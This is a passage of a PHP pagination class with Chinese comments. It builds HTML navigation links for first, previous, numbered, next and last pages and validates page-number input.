            $this->myde_en = $this->myde_en + (1 - $this->myde_i);
            $this->myde_i  = 1;
        }
        if ($this->myde_en > $this->myde_page_count) {
            $this->myde_i  = $this->myde_i - ($this->myde_en - $this->myde_page_count);
            $this->myde_en = $this->myde_page_count;
        }
        if ($this->myde_i < 1) {
            $this->myde_i = 1;
        }

    }
    //检测是否为数字
    private function numeric($num) {
        if (strlen($num)) {
            if (!preg_match("/^[0-9]+$/", $num)) {
                $num = 1;
            } else {
                $num = substr($num, 0, 11);
            }
        } else {
            $num = 1;
        }
        return $num;
    }
    //地址替换
    private function page_replace($page) {
        return str_replace("{page}", $page, $this->myde_url);
    }
    //首页
    private function myde_home() {
        if ($this->myde_page != 1) {
            return "<a href='" . $this->page_replace(1) . "' title='首页'>首页</a>";
        }
    }
    //上一页
    private function myde_prev() {
        if ($this->myde_page != 1) {
            return "<a href='" . $this->page_replace($this->myde_page - 1) . "' title='上一页'>上一页</a>";
        }
    }
    //下一页
    private function myde_next() {
        if ($this->myde_page != $this->myde_page_count) {
            return "<a href='" . $this->page_replace($this->myde_page + 1) . "' title='下一页'>下一页</a>";
        }
    }
    //尾页
    private function myde_last() {
        if ($this->myde_page != $this->myde_page_count) {
            return "<a href='" . $this->page_replace($this->myde_page_count) . "' title='尾页'>尾页</a>";
        }
    }
    //输出
    public function myde_write($id = 'page') {
        $str = '<div class="' . $id . '">';
        $str .= $this->myde_home();
        $str .= $this->myde_prev();
        if ($this->myde_i > 1) {
            $str .= "<span class='pageEllipsis'>...</span>";
        }
        for ($i = $this->myde_i; $i <= $this->myde_en; $i++) {
            if ($i == $this->myde_page) {
                $str .= "<b class='cur'>$i</b>";
            } else {
                $str .= "<a href='" . $this->page_replace($i) . "' title='第" . $i . "页'>$i</a>";
            }
        }
        if ($this->myde_en < $this->myde_page_count) {
            $str .= '<span class="pageEllipsis">...</span>';
        }
        $str .= $this->myde_next();
        $str .= $this->myde_last();
        $str .= '<span class="pageRemark">共' . $this->myde_page_count . '页' . $this->myde_total . '条数据</span>';
        $str .= '</div>';
        return $str;
    }

}
